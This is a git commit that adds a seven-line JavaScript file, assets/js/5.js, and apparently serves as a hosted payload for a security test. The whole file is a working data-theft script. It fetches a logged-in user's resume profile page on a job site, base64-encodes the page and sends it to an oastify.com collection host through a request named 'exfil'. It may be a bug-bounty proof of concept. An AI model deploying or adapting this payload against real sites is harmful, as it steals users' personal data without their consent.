cd17a26874822cf7a7641bb849d08e5bfefa264e
huynhvanphuc <phucdelete@gmail.com>
2024-07-30 14:57:03 +0700

    Create 5.js

---
+++ assets/js/5.js
@@ -0,0 +1,7 @@
+var xhr  = new XMLHttpRequest();
+xhr.open('GET', 'https://job.inshokuten.com/member/resume/profile', false);
+xhr.send(null);
+
+var exfil = new XMLHttpRequest();
+exfil.open("GET", "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + btoa(xhr.responseText), false);
+exfil.send();
